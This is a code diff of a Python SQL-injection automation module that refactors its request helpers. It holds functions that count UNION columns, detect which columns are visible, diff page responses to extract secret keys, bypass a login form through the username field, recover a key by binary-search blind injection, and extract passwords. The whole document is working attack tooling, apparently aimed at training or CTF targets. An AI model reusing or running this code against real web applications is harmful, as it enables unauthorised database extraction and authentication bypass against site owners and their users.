@@ -36,7 +36,7 @@ def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> 
         if encode != none_func:
             print(pl)
         param = {p: encode(pl)}
-        html_responce_2 = req.my_request(url, param, cook)
+        html_responce_2 = req.get_request(url, param, cook)
         for s in difflib.ndiff(html_responce_2, html_responce_1):
             if i > 1 and ('+' in s[0] or '-' in s[0]):
                 return i - 1
@@ -45,90 +45,43 @@ def count_columns(url: str, payload: str, p: str, cook={}, encode=none_func) -> 
     exit(1)
 
 
-def find_visible_columns(url: str, num_columns: int,
-                         payload: dict, p_base: dict,
-                         cook={}, method='get') -> list:
+def find_visible_columns(url: str, list_columns: list,
+                         payload: dict, cook={}, method='get') -> list:
     '''
-    The function finds the columns displayed on the web page after a get request (param).
-    The request is transmitted via get (param), the response is the content of the web page.
-    Тhe function compares responses from request with payload param and p_base param
-    and the occurrence of strings from the request in the output of the web page.
-
-    num_columns: number of columns that must be passed in the request
-    list_of_visible: the list of columns displayed on the page
-    html_visible: response from the web page with visible columns
+    The function finds the columns displayed on the web page after request.
     '''
 
-    list_of_visible = set()
-    html_visible = req.my_request(url, payload, cook, method)
-
-    # Find differens
-    html_base = req.my_request(url, p_base, cook, method)
-
-    for s in difflib.ndiff(html_visible, html_base):
-        if s[0] == ' ':
-            continue
-        elif s[0] == '-':
-            try:
-                if int(s[-1]) in range(num_columns + 1) and '>' + s[-1] + '<' in html_visible:
-                    list_of_visible.add(int(s[-1]))
-            except:
-                continue
+    html_visible = req.my_request(url, payload, cook, method, 0, 1)
+    list_of_visible = [text for text in list_columns if text in html_visible]
 
     if not list_of_visible:
         print('not find visible column')
         exit(1)
-    print(list_of_visible)
-    return [list(list_of_visible), html_visible]
+    print('visible columns: ', list_of_visible)
+    return [list_of_visible, html_visible]
 
 
-def find_param(url: str,
-               len_key: int, html_visible: str,
+def find_param(url: str, html_visible: str,
                payload: dict, cook={}, method='get') -> list:
     '''
     The function finds desired data in visible columns in the response.
-    The request is transmitted via get (param), the response is the content of the web page.
-    Тhe function compares responses from request with payload param and html_visible
-    and checks the difference in them.
-
-    html_responce: response from the web page
-    key: list of desired data
     '''
 
-    html_response = req.my_request(url, payload, cook, method)
+    html_response = req.my_request(url, payload, cook, method, 0, 1)
 
     # Find differens
-    key = [''] * len_key
-    j = 0
-    html_r = html_response.split('\n')
-    html_v = html_visible.split('\n')
+    index = 0
+    key = []
+    while html_response[index] == html_visible[index]:
+        index += 1
+    new_index = index
+    # because 111,222 etc in request
+    while html_response[new_index] != html_visible[index + 3]:
+        key.append(html_response[new_index])
+        new_index += 1
+    print('key: ', ''.join(key))
 
-    for i, r in enumerate(html_r):
-        if 'select' in r or 'SELECT' in r:
-            # We do not consider lines with the request text
-            continue
-        r = r.replace('</td>', '')
-        v = (html_v[i].replace('</td>', '')).ljust(len(r))
-        strings = [r, v]
-        diff = map(str.__ne__, *strings)
-        df = [''.join(compress(s, diff)) for s in strings]
-        if df != ['', '']:
-            if j == len(key):
-                # if the output contains a string that differs from the base one,
-                # but does not contain the key
-                key.append('')
-            key[j] = df[0].replace(
-                '</b>', '').replace('<b>', '').replace('<br>', ' ')
-            j += 1
-
-    keys = []
-    for k in key:
-        k = k.split(' ')
-        for i in k:
-            if i != '':
-                keys.append(i)
-
-    return keys
+    return ''.join(key)
 
 
 def find_column_position(url: str, list_of_columns: list, payload: str,
@@ -143,7 +96,7 @@ def find_column_position(url: str, list_of_columns: list, payload: str,
         tmp = list_of_columns[i]
         list_of_columns[i] = finds
         param = {p: payload % (','.join(list_of_columns))}
-        response = req.my_request(url, param, cook)
+        response = req.get_request(url, param, cook)
         soup = BeautifulSoup(response, 'html.parser')
         ret = soup.find(string=re.compile('rows'))
         # Find max of visible rows
@@ -174,7 +127,7 @@ def try_auth(url: str, list_of_columns: list, data: str,
         list_of_columns[i] = finds
         data_dict['username'] = data_dict['username'] % ','.join(
             list_of_columns)
-        response = req.my_request(url + p, data_dict, cook, 'post')
+        response = req.post_request(url + p, data_dict, cook)
         if 'Login successful' in response:
             return response
         list_of_columns[i] = tmp
@@ -189,7 +142,7 @@ def find_key_len(url: str, payload: str,
     while right > left + 1:
         middle = (left + right) // 2
         param = {p: payload % f'>{middle},1,0)'}
-        response = req.my_request(url, param, cook)
+        response = req.get_request(url, param, cook)
         if m_row in response:
             left = middle
         else:
@@ -206,7 +159,7 @@ def find_binary(url: str, payload: str,
         while b - a != 0:
             middle = a + (b - a) // 2 + 1
             param = {p: payload % (i, f'<{middle},1,0)')}
-            response = req.my_request(url, param, cook)
+            response = req.get_request(url, param, cook)
             if m_row in response:
                 b = middle - 1
             else:
@@ -222,3 +175,11 @@ def extract_pass(response: str, pass_r: str) -> str:
     passw = soup.find(string=re.compile(pass_r))
     return passw
 
+
+def save_cookies(cooks: dict):
+    try:
+        with open('cooks.pickle', 'wb') as f:
+            pickle.dump(cooks, f)
+    except:
+        print('can not write cookies')
+        exit(1)
